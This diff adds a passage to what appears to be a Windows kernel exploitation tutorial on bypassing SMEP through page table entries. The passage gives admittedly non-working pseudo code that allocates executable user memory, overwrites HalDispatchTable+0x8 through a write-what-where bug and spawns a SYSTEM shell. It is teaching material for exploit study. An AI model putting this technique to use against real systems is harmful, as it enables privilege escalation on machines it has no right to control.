@@ -29,3 +29,32 @@ Why Go to the Mountain, If You Can Bring the Mountain to You?
 
 The adage for the title of this section, comes from Spencer Pratt's [WriteProcessMemory() white paper](https://www.exploit-db.com/papers/13660) about bypassing DEP. This saying, or adage, is extremely applicable to the method of bypassing SMEP through PTEs.
 
+Let's start with some psuedo code!
+
+```python
+# Allocating user mode code
+payload = kernel32.VirtualAlloc(
+    c_int(0),                         # lpAddress
+    c_int(len(payload)),              # dwSize
+    c_int(0x3000),                    # flAllocationType
+    c_int(0x40)                       # flProtect
+)
+
+---------------------------------------------------------
+
+# Grabbing HalDispatchTable + 0x8 address
+HalDispatchTable+0x8 = NTBASE + 0xFFFFFF
+
+# Writing payload to HalDispatchTable + 0x8
+
+www.What = payload
+www.Where = HalDispatchTable + 0x8
+
+---------------------------------------------------------
+
+# Spawning SYSTEM shell
+print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!!!!"
+os.system("cmd.exe /K cd C:\\")
+```
+
+Note, the above code is syntactically incorrect, but it is there nonetheless to help us understand what is going on.
